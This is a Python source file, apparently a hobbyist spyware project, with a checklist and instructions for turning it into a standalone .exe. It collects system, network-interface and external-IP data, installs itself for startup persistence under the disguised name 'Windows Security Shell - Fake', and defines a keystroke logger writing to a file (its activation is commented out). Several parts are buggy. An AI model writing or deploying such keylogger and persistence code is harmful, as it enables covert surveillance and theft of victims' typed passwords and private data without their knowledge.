#1. System Information [DONE]
#2. Keylogger [DONE]
#3. Data to send [DONE]
#4. Automatic execution on system startup [DONE]
#5. Convert code to an image/.exe application [DONE]

#REQUIREMENTS
# Execute the respective commands in a cmd.
# -> python -m pip install psutil
# -> python -m pip install requests
# -> python -m pip install pynput

#REQUIREMENTS TO CREATE A .EXE
# -> python -m pip install pyinstaller
# -> Go to the directory of python and grab the dir of the pyinstaller.
# -> Go to the cmd and execute the following cmd: pyinstallerdirectory --onefile main.py


import platform
import psutil
from datetime import datetime
from requests import get
from pynput import keyboard
from time import strftime,gmtime
import datetime
import json
import os
import getpass

USER_NAME = getpass.getuser()
IsWindowsOS = 0
KeyLoggerFileDIR = r'C:\\Users\\%s\\Desktop\\Python-spyware\\output.txt' % USER_NAME
startupDIR = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
startupName = 'Windows Security Shell - Fake'

senddata = { 'network' : [], 'system' : '' , 'ipaddress' : '' }

def ExecKeyLogger_OnKeyPress(key):
    try:
        f=open(KeyLoggerFileDIR,"a")
        f.write(key.char)
    except AttributeError:
        if key==keyboard.Key.space:
            f.write(' ')
        if key==keyboard.Key.enter:
            f.write(os.linesep)
        if key==keyboard.Key.backspace:
            f.write('')
    except:
      print('Failed to catch numnomeric key')

def ExecKeyLogger_OnRelease(key):
    if int(datetime.datetime.now().strftime("%H")) not in range(8,23):
        return False

def GetExternalIP():
    try:
        ip = get('https://api.ipify.org').text
        senddata['ipaddress'] = ip
    except:
        senddata['ipaddress'] = 'Failed to retrive'


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return str(bytes) + " " + unit + suffix;
        bytes /= factor

def GetSystemInformation():
    uname = platform.uname()
    senddata['system'] = uname;

def NetworkInformation():
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            senddata['network'].append(address);
    net_io = psutil.net_io_counters()


def AddToRegistry(file_path):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = startupDIR %  USER_NAME
    with open(bat_path + '\\' + startupName, "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
        
GetSystemInformation()
NetworkInformation()
AddToRegistry("")
GetExternalIP()

jstr = json.dumps(senddata, indent=4)
print(jstr);

#activate keylogger 

#try:
#    with keyboard.Listener(on_press=ExecKeyLogger_OnKeyPress,on_release=ExecKeyLogger_OnRelease) as listener:
#        listener.join()
#except:
#    print("fix this ****")
